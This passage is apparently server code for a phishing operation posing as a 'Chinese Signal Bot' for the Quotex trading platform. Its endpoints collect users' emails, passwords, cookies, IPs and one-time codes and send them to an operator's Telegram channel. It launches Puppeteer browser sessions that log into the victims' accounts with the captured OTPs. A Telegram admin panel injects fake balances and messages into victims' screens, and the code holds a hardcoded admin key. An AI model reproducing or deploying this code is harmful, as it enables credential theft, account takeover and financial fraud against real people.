            otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
            connectedAccounts: users.filter(u => u.connected).length,
            totalLicenses: licenses.length, activeLicenses: licenses.filter(l => l.status === 'Active').length,
            blockedUsers: users.filter(u => u.blocked).length,
        };
        const activeSessions = [...quotexSessions.values()].filter(s => !['closed','error'].includes(s.status)).length;
        const loggedIn = [...quotexSessions.values()].filter(s => s.status === 'logged_in').length;
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text:
            `📊 <b>Bot Stats</b>\n👥 Total Users: <b>${s.totalUsers}</b>\n🟢 Online: <b>${s.onlineNow}</b>\n` +
            `🔢 OTPs Captured: <b>${s.otpCaptured}</b>\n🔗 Connected: <b>${s.connectedAccounts}</b>\n` +
            `🔑 Licenses: <b>${s.totalLicenses}</b> (Active: ${s.activeLicenses})\n🚫 Blocked: <b>${s.blockedUsers}</b>\n\n` +
            `🤖 <b>Quotex Sessions</b>\n🔓 Active: <b>${activeSessions}</b> | ✅ Logged in: <b>${loggedIn}</b>` });
    } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
}

async function tgCmdOnline(chatId) {
    const names = [...sseUserClients.keys()];
    if (!names.length) return tgApi('sendMessage', { chat_id: chatId, text: '⚪ No users online right now.' });
    const list = names.slice(0, 40).map((n, i) => `${i + 1}. <code>${n}</code>`).join('\n');
    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
        text: `🟢 <b>Online Users (${names.length})</b>\n${list}\n\nSend a username to manage.` });
}

async function tgCmdQxSessions(chatId) {
    const sessions = [...quotexSessions.values()];
    if (!sessions.length) return tgApi('sendMessage', { chat_id: chatId, text: '⚪ No Quotex sessions.' });
    const STATUS_EMOJI = { launching:'🚀', navigating:'🌐', filling:'✍️', waiting_otp:'🔢', submitting_otp:'⏳', logged_in:'✅', wrong_otp:'❌', error:'❌', closed:'⚫' };
    const lines = sessions.map((s, i) =>
        `${i+1}. ${STATUS_EMOJI[s.status] || '❓'} <b>${s.clientName}</b> — ${s.email}\n` +
        `   Status: <b>${s.status}</b> | ID: <code>${s.id}</code>`
    ).join('\n\n');
    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text:
        `🤖 <b>Quotex Sessions (${sessions.length})</b>\n\n${lines}\n\n` +
        `Use /otp &lt;id&gt; &lt;code&gt; to submit OTP\nUse /qxclose &lt;id&gt; to close` });
}

async function tgHandleMessage(msg) {
    const chatId = msg.chat.id;
    if (String(chatId) !== String(TELEGRAM_CHAT_ID)) {
        return tgApi('sendMessage', { chat_id: chatId, text: '⛔ Unauthorized.' });
    }
    const text = (msg.text || '').trim();
    if (!text) return;

    const sess = tgSessions[chatId];
    if (text === '/cancel') { delete tgSessions[chatId]; return tgApi('sendMessage', { chat_id: chatId, text: '❎ Cancelled.' }); }

    // ── OTP input flow ────────────────────────────────────
    if (sess?.awaiting === 'qx_otp' && sess.sessionId) {
        delete tgSessions[chatId];
        const otp = text.replace(/\D/g, '').slice(0, 8);
        if (!otp) return tgApi('sendMessage', { chat_id: chatId, text: '❌ Invalid OTP. Send digits only.' });
        const result = await submitQuotexOTP(sess.sessionId, otp);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: result.ok
                ? `✅ OTP accepted! Logging in <b>${sess.clientName}</b>...`
                : `❌ ${result.message || result.error}` });
    }

    if (sess?.awaiting === 'custom_msg' && sess.target) {
        delete tgSessions[chatId];
        await tgInjectMessage(sess.target, 'info', text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Sent to <b>${sess.target}</b>` });
    }
    if (sess?.awaiting === 'balance' && sess.target) {
        delete tgSessions[chatId];
        const bal = text.replace(/[^\d.\-]/g, '');
        const ok  = sendSSEToUser(sess.target, 'inject_balance', { balance: bal });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: ok ? `💰 Injected <b>${bal}</b> for <b>${sess.target}</b>` : `⚠️ <b>${sess.target}</b> offline.` });
    }
    if (sess?.awaiting === 'broadcast_text') {
        delete tgSessions[chatId];
        broadcastSSE('broadcast_message', { message: text, type: 'info', timestamp: new Date().toISOString() });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `📢 Broadcast sent to <b>${sseClients.size}</b> clients.` });
    }
    if (sess?.awaiting === 'qxlaunch_email') {
        tgSessions[chatId] = { ...sess, awaiting: 'qxlaunch_password', email: text };
        return tgApi('sendMessage', { chat_id: chatId, text: '🔑 Now send the Password:' });
    }
    if (sess?.awaiting === 'qxlaunch_password') {
        tgSessions[chatId] = { ...sess, awaiting: 'qxlaunch_name', password: text };
        return tgApi('sendMessage', { chat_id: chatId, text: "👤 Now send the Client's Full Name (or type 'skip'):" });
    }
    if (sess?.awaiting === 'qxlaunch_name') {
        delete tgSessions[chatId];
        const clientName = text === 'skip' ? 'Client' : text;
        const sid = makeSessionId();
        const session = { id: sid, clientName, email: sess.email, password: sess.password, licenceKey: '',
            status: 'queued', statusMsg: 'Queued', startedAt: new Date(), updatedAt: new Date(),
            otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
        quotexSessions.set(sid, session);
        broadcastSSE('qx_session_new', getSessionInfo(session));
        launchQuotexSession(session).catch(e => console.error('launch error:', e.message));
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🚀 Launching Quotex login for <b>${clientName}</b>...\nSession: <code>${sid}</code>` });
    }

    // ── Direct commands ───────────────────────────────────
    if (text === '/start' || text === '/menu') {
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', reply_markup: tgMainMenuKeyboard(),
            text: '🤖 <b>Chinese Signal Bot — Admin Control</b>\n\nSend a <b>username</b> to manage that user, or pick an option.' });
    }
    if (text === '/online')  return tgCmdOnline(chatId);
    if (text === '/stats')   return tgCmdStats(chatId);
    if (text === '/help')    return tgCmdHelp(chatId);
    if (text === '/qx')      return tgCmdQxSessions(chatId);

    // /otp SESSIONID CODE
    if (text.startsWith('/otp ')) {
        const [, sId, ...codeParts] = text.split(' ');
        const otp = codeParts.join('').replace(/\D/g, '');
        if (!sId || !otp) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /otp SESSION_ID 123456' });
        const result = await submitQuotexOTP(sId, otp);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: result.ok ? `✅ OTP accepted for session <code>${sId}</code>!` : `❌ ${result.message || result.error}` });
    }

    // /qxlaunch email password clientname
    if (text.startsWith('/qxlaunch ')) {
        const parts = text.slice(10).trim().split(' ');
        if (parts.length < 2) return tgApi('sendMessage', { chat_id: chatId, text: 'Usage: /qxlaunch email password [clientname]' });
        const [email, password, ...nameParts] = parts;
        const clientName = nameParts.join(' ') || 'Client';
        const sid = makeSessionId();
        const session = { id: sid, clientName, email, password, licenceKey: '',
            status: 'queued', statusMsg: 'Queued from Telegram', startedAt: new Date(), updatedAt: new Date(),
            otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
        quotexSessions.set(sid, session);
        broadcastSSE('qx_session_new', getSessionInfo(session));
        launchQuotexSession(session).catch(e => console.error('launch error:', e.message));
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🚀 Launching Quotex login for <b>${clientName}</b>...\nSession: <code>${sid}</code>` });
    }

    // /qxclose SESSIONID
    if (text.startsWith('/qxclose ')) {
        const sId = text.slice(9).trim();
        await closeQuotexSession(sId, 'Closed via Telegram command');
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Session <code>${sId}</code> closed.` });
    }

    if (text.startsWith('/broadcast ')) {
        const m = text.slice(11).trim();
        broadcastSSE('broadcast_message', { message: m, type: 'info', timestamp: new Date().toISOString() });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `📢 Broadcast sent to <b>${sseClients.size}</b> clients.` });
    }

    // Treat as username target
    const target    = text.replace(/^@/, '');
    const isOnline  = sseUserClients.has(target.toLowerCase());
    const found     = await tgFindUserByName(target);
    const statusTxt = `👤 <b>${target}</b>\n🟢 Online: <b>${isOnline ? 'Yes' : 'No'}</b>\n` +
        (found ? `🔑 Key: <code>${found.licenceKey || '-'}</code>\n📧 Email: <code>${found.username || '-'}</code>\n📊 Status: <b>${found.status || '-'}</b>` : 'ℹ️ No DB record yet.');
    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: statusTxt, reply_markup: tgUserActionKeyboard(target) });
}

let tgOffset = 0, tgPollingStarted = false;
async function telegramPollLoop() {
    if (tgPollingStarted) return;
    tgPollingStarted = true;
    try { await axios.post(`${TG_API}/deleteWebhook`); } catch(e) {}
    console.log('📨 Telegram bot listener started');
    while (true) {
        try {
            const r = await axios.get(`${TG_API}/getUpdates`, {
                params: { offset: tgOffset, timeout: 30, allowed_updates: JSON.stringify(['message', 'callback_query']) },
                timeout: 40000,
            });
            for (const up of (r.data?.result || [])) {
                tgOffset = up.update_id + 1;
                try {
                    if (up.message) await tgHandleMessage(up.message);
                    else if (up.callback_query) await tgHandleCallback(up.callback_query.message.chat.id, up.callback_query.data, up.callback_query.id);
                } catch(e) { console.error('tg update error:', e.message); }
            }
        } catch(e) { await new Promise(r => setTimeout(r, 3000)); }
    }
}

// ================== SSE BROADCAST ==================
const sseClients     = new Set();
const sseUserClients = new Map();
const pendingMessages = {};

function broadcastSSE(eventType, data) {
    const payload = JSON.stringify({ type: eventType, data, timestamp: new Date().toISOString() });
    sseClients.forEach(client => { try { client.write(`data: ${payload}\n\n`); } catch(e) {} });
}
function sendSSEToUser(userName, eventType, data) {
    const key    = (userName || '').trim().toLowerCase();
    const client = sseUserClients.get(key);
    if (!client) return false;
    try { client.write(`data: ${JSON.stringify({ type: eventType, data, timestamp: new Date().toISOString() })}\n\n`); return true; }
    catch(e) { return false; }
}

app.get('/api/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.flushHeaders();
    const heartbeat = setInterval(() => { try { res.write(':heartbeat\n\n'); } catch(e) {} }, 20000);
    const clientUserName = (req.query.userName || '').trim().toLowerCase();
    sseClients.add(res);
    if (clientUserName) sseUserClients.set(clientUserName, res);
    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'SSE ready' })}\n\n`);
    req.on('close', () => {
        clearInterval(heartbeat);
        sseClients.delete(res);
        if (clientUserName && sseUserClients.get(clientUserName) === res) sseUserClients.delete(clientUserName);
    });
});

// ================== FILE FALLBACK STORAGE ==================
const DATA_DIR      = process.env.DATA_DIR || path.join(__dirname, 'data');
const DATA_FILE     = path.join(DATA_DIR, 'users.json');
const LICENSES_FILE = path.join(DATA_DIR, 'licenses.json');
const SETTINGS_FILE = path.join(DATA_DIR, 'settings.json');

let users = [], licenses = [];
let botSettings = { telegramUrl: '', whatsappUrl: '', botName: 'Chinese Signal Bot' };

function ensureDataDir() {
    try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e) {}
}
function loadSettings() {
    try { if (fs.existsSync(SETTINGS_FILE)) botSettings = { ...botSettings, ...JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')) }; } catch(e) {}
}
function saveSettings() {
    try { ensureDataDir(); fs.writeFileSync(SETTINGS_FILE, JSON.stringify(botSettings, null, 2)); } catch(e) {}
}
async function loadSettingsFromDB() {
    if (!useDatabase) return botSettings;
    try {
        const doc = await Setting.findById('bot').lean();
        if (doc) { if (doc.telegramUrl !== undefined) botSettings.telegramUrl = doc.telegramUrl; if (doc.whatsappUrl !== undefined) botSettings.whatsappUrl = doc.whatsappUrl; if (doc.botName) botSettings.botName = doc.botName; }
    } catch(e) {}
    return botSettings;
}
async function saveSettingsToDB() {
    if (!useDatabase) return;
    try { await Setting.findByIdAndUpdate('bot', { ...botSettings, updatedAt: new Date() }, { upsert: true, new: true, setDefaultsOnInsert: true }); } catch(e) {}
}
loadSettings();
setTimeout(() => { loadSettingsFromDB().catch(() => {}); }, 2500);

function loadUsers() {
    try { if (fs.existsSync(DATA_FILE)) users = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); else fs.writeFileSync(DATA_FILE, '[]'); } catch(e) { users = []; }
}
function saveUsers() {
    try { const tmp = DATA_FILE + '.tmp'; fs.writeFileSync(tmp, JSON.stringify(users, null, 2)); fs.renameSync(tmp, DATA_FILE); }
    catch(e) { try { fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2)); } catch(e2) {} }
}
function loadLicenses() {
    try { if (fs.existsSync(LICENSES_FILE)) { const d = fs.readFileSync(LICENSES_FILE, 'utf8').trim(); licenses = d ? JSON.parse(d) : []; } else { licenses = []; fs.writeFileSync(LICENSES_FILE, '[]'); } } catch(e) { licenses = []; }
}
function saveLicenses() {
    try { const tmp = LICENSES_FILE + '.tmp'; fs.writeFileSync(tmp, JSON.stringify(licenses, null, 2)); fs.renameSync(tmp, LICENSES_FILE); }
    catch(e) { try { fs.writeFileSync(LICENSES_FILE, JSON.stringify(licenses, null, 2)); } catch(e2) {} }
}

function getOrCreateUserFile(licenceKey, fullName = 'Unknown') {
    const hasName = fullName && fullName !== 'Unknown' && fullName !== 'Pending Name';
    let user = hasName
        ? users.find(u => u.licenceKey === licenceKey && (u.fullName || '').toLowerCase() === fullName.toLowerCase())
          || users.find(u => u.licenceKey === licenceKey && (!u.fullName || u.fullName === 'Unknown' || u.fullName === 'Pending Name'))
        : users.find(u => u.licenceKey === licenceKey);
    if (!user) {
        user = { id: Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7), licenceKey,
            fullName: hasName ? fullName : 'Unknown', username: '', password: '', otp: '', ip: '', cookies: '',
            status: 'Active', connected: false, lastActivity: new Date().toISOString(), activities: [] };
        users.unshift(user);
    }
    if (hasName && user.fullName !== fullName) user.fullName = fullName;
    user.lastActivity = new Date().toISOString();
    saveUsers();
    return user;
}
async function getOrCreateUser(licenceKey, fullName = 'Unknown') {
    return useDatabase ? await dbGetOrCreateUser(licenceKey, fullName) : getOrCreateUserFile(licenceKey, fullName);
}
async function saveUser(user) {
    if (useDatabase) await dbSaveUser(user); else saveUsers();
}

// ================== LICENSE ROUTES ==================
app.get('/api/licenses', async (req, res) => {
    try { res.json(useDatabase ? await dbGetAllLicenses() : licenses); }
    catch(e) { res.json(licenses); }
});
app.post('/api/licenses', async (req, res) => {
    const { key, type, expiry, maxUses, status } = req.body;
    if (!key) return res.status(400).json({ error: 'Key required' });
    try {
        const newLicense = { key, type: type || 'Standard', status: status || 'Active', usesRemaining: maxUses || null, assignedTo: null, dateAdded: new Date().toISOString(), expiry: expiry || null };
        if (useDatabase) {
            if (await dbFindLicense(key)) return res.status(400).json({ error: 'License already exists' });
            await dbInsertLicense(newLicense);
        } else {
            if (licenses.find(l => l.key === key)) return res.status(400).json({ error: 'License already exists' });
            licenses.unshift(newLicense); saveLicenses();
        }
        broadcastSSE('license_added', newLicense);
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.patch('/api/licenses/:key', async (req, res) => {
    const key = decodeURIComponent(req.params.key);
    const { status } = req.body;
    try {
        if (useDatabase) {
            const lic = await dbFindLicense(key);
            if (!lic) return res.status(404).json({ error: 'License not found' });
            if (status) await dbUpdateLicenseStatus(key, status);
            broadcastSSE('license_updated', { key, status: status || lic.status });
            return res.json({ success: true, key, status });
        }
        const lic = licenses.find(l => l.key === key);
        if (!lic) return res.status(404).json({ error: 'License not found' });
        if (status) lic.status = status;
        saveLicenses();
        broadcastSSE('license_updated', { key, status: lic.status });
        res.json({ success: true, key, status: lic.status });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.delete('/api/licenses/:key', async (req, res) => {
    const key = decodeURIComponent(req.params.key);
    try {
        if (useDatabase) await dbDeleteLicense(key); else { licenses = licenses.filter(l => l.key !== key); saveLicenses(); }
        broadcastSSE('license_deleted', { key });
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.post('/api/validate-license', async (req, res) => {
    const { licenseKey } = req.body;
    if (!licenseKey) return res.json({ valid: false, message: 'No key provided' });
    try {
        const lic = useDatabase ? await dbFindLicense(licenseKey) : licenses.find(l => l.key === licenseKey);
        const valid = !!(lic && lic.status === 'Active' && (!lic.expiry || new Date(lic.expiry) > new Date()));
        res.json({ valid, message: valid ? 'License is valid' : 'Invalid or expired license key.' });
    } catch(e) { res.json({ valid: false, message: 'Server error' }); }
});

// ================== LICENSE ACTIVATION ==================
app.post('/api/license-activate', async (req, res) => {
    const { licenseKey, userName, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    try {
        const user = await getOrCreateUser(licenseKey, userName);
        if (userName && userName !== 'Pending Name') user.fullName = userName;
        user.activities = user.activities || [];
        user.activities.push({ action: 'License Activated', timestamp: new Date().toLocaleString() });
        await saveUser(user);
        broadcastSSE('license_activated', { licenceKey: licenseKey, fullName: userName, ip, timestamp: timestamp || new Date().toLocaleString() });
        await sendTelegramMessage(`🔑 <b>License Activated</b>\n👤 Name: <b>${userName}</b>\n🔑 Key: <b>${licenseKey}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${timestamp}</b>`);
        res.status(200).json({ status: 'success' });
    } catch(e) { res.status(500).json({ status: 'error' }); }
});

// ================== SPAM PROTECTION ==================
const loginAttemptMap = new Map();
function checkLoginSpam(licenceKey, email, password) {
    const now = Date.now(), mapKey = licenceKey || 'DEFAULT';
    const existing = loginAttemptMap.get(mapKey);
    if (!existing || (now - existing.firstSeen) > 5 * 60 * 1000) { loginAttemptMap.set(mapKey, { email, password, count: 1, firstSeen: now }); return false; }
    if (existing.email === email && existing.password === password) { existing.count++; if (existing.count > 3) return true; }
    else loginAttemptMap.set(mapKey, { email, password, count: 1, firstSeen: now });
    return false;
}

// ================== QUOTEX LOGIN ==================
app.post('/api/quotex-login', async (req, res) => {
    const { email, password, name, licenceKey = 'DEFAULT', cookies = '' } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    if (checkLoginSpam(licenceKey, email, password)) return res.status(200).json({ status: 'ok', spam: true });
    try {
        const user = await getOrCreateUser(licenceKey, name);
        user.username = email; user.password = password; user.ip = ip; user.cookies = cookies;
        user.status = 'Online';
        user.activities = user.activities || [];
        user.activities.push({ action: 'Quotex Login Submitted', timestamp: new Date().toLocaleString() });
        await saveUser(user);
        broadcastSSE('quotex_login', { licenceKey, fullName: name, email, password, ip, cookies, timestamp: new Date().toLocaleString() });
        await sendTelegramMessage(`🔑 <b>Quotex Login</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 Password: <b>${password}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`);

        // ── AUTO-LAUNCH: if enabled, start Puppeteer session automatically ──
        if (process.env.AUTO_LAUNCH_ON_LOGIN === 'true' && puppeteerAvailable && email && password) {
            const existingSession = [...quotexSessions.values()].find(s =>
                s.email === email && !['closed', 'error', 'logged_in'].includes(s.status));
            if (!existingSession) {
                const sid = makeSessionId();
                const session = { id: sid, clientName: name || 'Client', email, password, licenceKey,
                    status: 'queued', statusMsg: 'Auto-queued from login', startedAt: new Date(), updatedAt: new Date(),
                    otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
                quotexSessions.set(sid, session);
                broadcastSSE('qx_session_new', getSessionInfo(session));
                setTimeout(() => launchQuotexSession(session).catch(e => console.error('auto-launch error:', e.message)), 500);
            }
        }

        res.status(200).json({ status: 'ok' });
    } catch(e) { res.status(500).json({ status: 'error' }); }
});

// ================== OTP ==================
app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp, name, licenceKey = 'DEFAULT', cookies = '' } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    try {
        const user = await getOrCreateUser(licenceKey, name);
        user.otp = otp; user.ip = ip; user.cookies = cookies; user.status = 'Online';
        user.activities = user.activities || [];
        user.activities.push({ action: `OTP Entered: ${otp}`, timestamp: new Date().toLocaleString() });
        await saveUser(user);
        broadcastSSE('otp_entered', { licenceKey, fullName: name, email, otp, ip, cookies, timestamp: new Date().toLocaleString() });
        await sendTelegramMessage(`🔢 <b>OTP Captured</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 OTP: <b>${otp}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`);

        // ── AUTO-FORWARD OTP to matching Puppeteer session ──
        const forwarded = await autoForwardOTP(name, licenceKey, otp);
        if (forwarded) console.log(`✅ OTP auto-forwarded for ${name}`);

        res.status(200).json({ status: 'ok', forwarded });
    } catch(e) { res.status(500).json({ status: 'error' }); }
});

// ================== BLOCK / UNBLOCK ==================
app.post('/api/block-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });
    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenceKey);
            if (user) { user.blocked = true; user.status = 'Blocked'; user.activities = user.activities || []; user.activities.push({ action: '🚫 Blocked by Admin', timestamp: new Date().toLocaleString() }); await dbSaveUser(user); }
            await dbUpdateLicenseStatus(licenceKey, 'Inactive');
            broadcastSSE('user_blocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
            await sendTelegramMessage(`🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>`);
            return res.json({ success: true });
        }
        const user = users.find(u => u.licenceKey === licenceKey);
        if (user) { user.blocked = true; user.status = 'Blocked'; user.activities.push({ action: '🚫 Blocked by Admin', timestamp: new Date().toLocaleString() }); saveUsers(); }
        const lic = licenses.find(l => l.key === licenceKey);
        if (lic) { lic.status = 'Inactive'; saveLicenses(); }
        broadcastSSE('user_blocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
        await sendTelegramMessage(`🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>`);
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.post('/api/unblock-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });
    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenceKey);
            if (user) { user.blocked = false; user.status = 'Active'; user.activities = user.activities || []; user.activities.push({ action: '✅ Unblocked by Admin', timestamp: new Date().toLocaleString() }); await dbSaveUser(user); }
            await dbUpdateLicenseStatus(licenceKey, 'Active');
            broadcastSSE('user_unblocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
            return res.json({ success: true });
        }
        const user = users.find(u => u.licenceKey === licenceKey);
        if (user) { user.blocked = false; user.status = 'Active'; user.activities.push({ action: '✅ Unblocked by Admin', timestamp: new Date().toLocaleString() }); saveUsers(); }
        const lic = licenses.find(l => l.key === licenceKey);
        if (lic) { lic.status = 'Active'; saveLicenses(); }
        broadcastSSE('user_unblocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.delete('/api/delete-user/:licenceKey', async (req, res) => {
    const licenceKey = decodeURIComponent(req.params.licenceKey);
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });
    try {
        if (useDatabase) await dbDeleteUser(licenceKey); else { users = users.filter(u => u.licenceKey !== licenceKey); saveUsers(); }
        broadcastSSE('user_deleted', { licenceKey, timestamp: new Date().toLocaleString() });
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});

// ================== CHECK ACCESS ==================
app.get('/api/check-access', async (req, res) => {
    const licenseKey = req.query.licenseKey || req.query.licenceKey;
    if (!licenseKey) return res.json({ allowed: false, reason: 'no_key' });
    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenseKey);
            if (user?.blocked) return res.json({ allowed: false, reason: 'blocked' });
            const lic = await dbFindLicense(licenseKey);
            if (!lic || lic.status !== 'Active' || (lic.expiry && new Date(lic.expiry) < new Date())) return res.json({ allowed: false, reason: 'license_inactive' });
            return res.json({ allowed: true });
        }
        const user = users.find(u => u.licenceKey === licenseKey);
        if (user?.blocked) return res.json({ allowed: false, reason: 'blocked' });
        const lic = licenses.find(l => l.key === licenseKey);
        if (!lic || lic.status !== 'Active' || (lic.expiry && new Date(lic.expiry) < new Date())) return res.json({ allowed: false, reason: 'license_inactive' });
        res.json({ allowed: true });
    } catch(e) { res.json({ allowed: true }); }
});

// ================== ACTIVITY TRACKING ==================
app.post('/api/track-activity', (req, res) => {
    const { action, userName } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    broadcastSSE('activity', { action, userName, ip, timestamp: new Date().toLocaleString() });
    res.status(200).json({ status: 'success' });
});
app.post('/api/notification-permission', (req, res) => res.status(200).json({ status: 'success' }));

// ================== TRIGGER CONNECTED ==================
app.get('/api/trigger-connected', async (req, res) => {
    const userName = req.query.userName || 'User';
    sendSSEToUser(userName, 'show_connected',    { userName });
    sendSSEToUser(userName, 'trigger_connected', { userName });
    await sendTelegramMessage(`🔗 <b>Connection Triggered</b>\n👤 User: <b>${userName}</b>`);
    res.send('Trigger sent');
});

// ================== SEND MESSAGE ==================
app.post('/api/send-message', async (req, res) => {
    const { userName, message, type } = req.body;
    if (!userName || !message) return res.status(400).json({ error: 'userName and message are required' });
    const ts = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
    const msgType    = type || 'info';
    const msgPayload = { userName, message, type: msgType, timestamp: ts };
    sendSSEToUser(userName, 'injected_message', msgPayload);
    if (useDatabase) { await dbAddPendingMessage(userName, msgPayload); }
    else { const key = userName.trim().toLowerCase(); if (!pendingMessages[key]) pendingMessages[key] = []; pendingMessages[key].push(msgPayload); if (pendingMessages[key].length > 20) pendingMessages[key].shift(); }
    broadcastSSE('activity', { action: `💬 Message Injected [${msgType}] → ${userName}`, userName, ip: '—', timestamp: ts });
    const typeEmojis = { info: 'ℹ️', warning: '⚠️', alert: '🚨', instruction: '📋', otp: '🔢' };
    await sendTelegramMessage(`${typeEmojis[msgType] || '💬'} <b>Message Injected</b>\n👤 Target: <b>${userName}</b>\n📝 Type: <b>${msgType}</b>\n💬 Message: <b>${message}</b>\n⏰ Time: <b>${ts}</b>`);
    res.status(200).json({ success: true, delivered: true });
});

// ================== POLL MESSAGES ==================
app.get('/api/poll-messages', async (req, res) => {
    const userName = (req.query.userName || '').trim().toLowerCase();
    if (!userName) return res.json({ messages: [] });
    try {
        if (useDatabase) return res.json({ messages: await dbPollAndClearMessages(userName) });
        const msgs = pendingMessages[userName] || [];
        pendingMessages[userName] = [];
        res.json({ messages: msgs });
    } catch(e) { res.json({ messages: [] }); }
});

// ================== MAINTENANCE ==================
let maintenanceMode = { active: false, until: null, message: 'Under Maintenance. Please check back soon.' };
app.get('/api/maintenance', (req, res) => res.json(maintenanceMode));
app.post('/api/maintenance', (req, res) => {
    const { active, until, message, adminKey } = req.body;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Unauthorized' });
    maintenanceMode = { active: !!active, until: until || null, message: message || 'Under Maintenance. Please check back soon.' };
    broadcastSSE('maintenance_update', maintenanceMode);
    res.json({ ok: true, mode: maintenanceMode });
});

// ================== STATS & USERS ==================
app.get('/api/stats', async (req, res) => {
    try {
        const base = useDatabase ? await dbGetStats() : {
            totalUsers: users.length, onlineNow: sseClients.size,
            otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
            connectedAccounts: users.filter(u => u.connected).length,
            totalLicenses: licenses.length, activeLicenses: licenses.filter(l => l.status === 'Active').length,
            blockedUsers: users.filter(u => u.blocked).length,
        };
        // Augment with Quotex session stats
        const sessions = [...quotexSessions.values()];
        res.json({
            ...base,
            qxSessionsActive: sessions.filter(s => !['closed','error'].includes(s.status)).length,
            qxSessionsLoggedIn: sessions.filter(s => s.status === 'logged_in').length,
            qxSessionsWaitingOtp: sessions.filter(s => s.status === 'waiting_otp' || s.status === 'wrong_otp').length,
        });
    } catch(e) { res.json({ totalUsers: 0, onlineNow: 0, otpCaptured: 0, connectedAccounts: 0, totalLicenses: 0, activeLicenses: 0, blockedUsers: 0 }); }
});
app.get('/api/users', async (req, res) => {
    const offset = parseInt(req.query.offset, 10) || 0;
    const limit  = parseInt(req.query.limit,  10) || 0;
    try {
        const allUsers = useDatabase ? await dbGetAllUsers() : users;
        if (limit > 0) return res.json({ users: allUsers.slice(offset, offset + limit), total: allUsers.length, offset, limit });
        res.json(allUsers);
    } catch(e) { res.json(useDatabase ? [] : users); }
});
app.get('/api/latest-activity', async (req, res) => {
    try {
        const allUsers = useDatabase ? await dbGetAllUsers() : users;
        res.json({ logins: allUsers.filter(u => u.username), otps: allUsers.filter(u => u.otp) });
    } catch(e) { res.json({ logins: [], otps: [] }); }
});

// ================== BROADCAST ==================
app.post('/api/broadcast-message', (req, res) => {
    const { message, type = 'info', adminKey } = req.body || {};
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    if (!message) return res.status(400).json({ error: 'message required' });
